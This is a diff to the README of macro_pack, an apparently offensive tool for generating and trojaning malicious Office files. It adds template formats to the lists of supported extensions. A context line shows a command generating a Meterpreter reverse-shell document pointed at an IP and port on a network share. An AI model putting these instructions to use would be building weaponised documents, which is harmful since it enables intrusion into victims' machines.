@@ -46,10 +46,10 @@ Macro Pack pro version also allow to trojan existing Office files with option --
 
 Ms Office Supported formats are:
 * MS Word 97 (.doc)
-* MS Word (.docm, .docx)
+* MS Word (.docm, .docx, .dotm)
 * MS Excel 97 (.xls)
-* MS Excel (.xlsm, .xslx)
-* MS PowerPoint (.pptm)
+* MS Excel (.xlsm, .xslx, .xltm)
+* MS PowerPoint (.pptm, .potm)
 * MS Visio 97 (.vsd)
 * MS Visio (.vsdm)
 * MS Project (.mpp)
@@ -315,7 +315,7 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
         Help for template usage: macro_pack.exe -t help
          
     -G, --generate=OUTPUT_FILE_PATH. Generates a file. Will guess the format based on extension.
-        Supported Ms Office extensions are: doc, docm, docx, xls, xlsm, xslx, pptm, vsd, vsdm, mpp.
+        Supported Ms Office extensions are: doc, docm, docx, dotm, xls, xlsm, xslx, xltm, pptm, potm, vsd, vsdm, mpp.
         Note: Ms Office file generation requires Windows OS with right MS Office application installed.
         Supported Visual Basic scripts extensions are: vba, vbs, wsf, wsc, sct, hta, xsl.
         Supported shortcuts/shell extensions are: lnk, scf, url, glk, settingcontent-ms, library-ms, inf
